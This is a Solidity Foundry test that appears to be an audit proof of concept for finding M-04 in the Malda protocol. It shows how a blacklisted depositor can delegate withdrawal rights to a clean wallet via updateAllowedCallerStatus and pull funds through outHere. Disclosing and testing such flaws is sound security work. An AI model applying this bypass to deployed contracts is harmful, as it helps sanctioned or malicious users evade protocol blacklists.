// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {Test} from "forge-std/Test.sol";
import {Rebalancer_Unit_Shared} from "../test/unit/shared/Rebalancer_Unit_Shared.t.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/// @title M-04: Blacklist Bypass via allowedCallers Delegation
/// @notice The `outHere` function verifies that `msg.sender` and the `receiver` parameter are not blacklisted.
///         However, internally, it overrides the `receiver` parameter with the original `_sender` (who supplied the funds).
///         A blacklisted user can bypass the checks entirely by delegating withdrawal rights to a secondary
///         clean address using `updateAllowedCallerStatus`. The clean address calls `outHere`, passing the modifier checks,
///         and the funds are sent directly to the blacklisted original sender.
/// @author 0xSchutze
contract Malda_M04_BypassBlacklist is Test, Rebalancer_Unit_Shared {

    address public cleanWallet;
    bytes public journalData;
    uint256[] public amountArray;

    function _additionalSetup() internal {
        // Setup a secondary clean wallet controlled by the attacker
        cleanWallet = makeAddr("CleanWallet");
        
        // Setup initial funds and approvals for Alice
        deal(address(weth), alice, 1000e18);
        vm.prank(alice);
        weth.approve(address(mWethExtension), type(uint256).max);
        
        // Construct the single journal representing Alice's deposit
        bytes memory singleJournal = abi.encodePacked(
            alice,                     // sender (20 bytes)
            address(mWethExtension),   // market (20 bytes)
            uint256(1000e18),          // accAmountIn (32 bytes)
            uint256(1000e18),          // accAmountOut (32 bytes)
            uint32(59144),             // chainId (4 bytes) - LINEA_CHAIN_ID
            uint32(block.chainid),     // dstChainId (4 bytes)
            bool(true)                 // L1inclusion (1 byte)
        );
       
        bytes[] memory journals = new bytes[](1);
        journals[0] = singleJournal;
        journalData = abi.encode(journals);

        amountArray = new uint256[](1);
        amountArray[0] = 1000e18;
        
        // Note: We DO NOT grant PROOF_BATCH_FORWARDER to cleanWallet here.
        // We want to prove this can be done by a completely unprivileged user.
    }

    /// @notice Uses allowedCallers to execute an unprivileged blacklist bypass on the outHere endpoint.
    function test_M04_BlacklistBypass_ViaAllowedCallers() public {
        _additionalSetup();
        
        // 1. Setup: Alice supplies funds normally before being blacklisted
        mWethExtension.setWhitelistedUser(alice, true);
        vm.prank(alice);
        mWethExtension.supplyOnHost(1000e18, alice, bytes4(0));

        // 2. Setup: Alice commits malicious activity and is blacklisted
        blacklister.blacklist(alice);

        // 3. Assert (Pre-Exploit): Alice directly calling outHere reverts due to blacklist
        vm.prank(alice);
        vm.expectRevert();
        mWethExtension.outHere(journalData, "", amountArray, alice);

        // 4. Exploit (Arrange): Alice authorizes her secondary clean wallet
        // Because updateAllowedCallerStatus does not check if msg.sender is blacklisted!
        vm.prank(alice);
        mWethExtension.updateAllowedCallerStatus(cleanWallet, true);

        // 5. Exploit (Act): Clean wallet executes the withdrawal on behalf of Alice
        vm.prank(cleanWallet);
        mWethExtension.outHere(journalData, "", amountArray, cleanWallet);  

        // 6. Assert: Alice successfully bypassed the blacklist and received her funds back
        assertEq(
            IERC20(address(weth)).balanceOf(alice),
            1000e18,
            "Blacklisted user successfully extracted funds via proxy"
        );
    }
}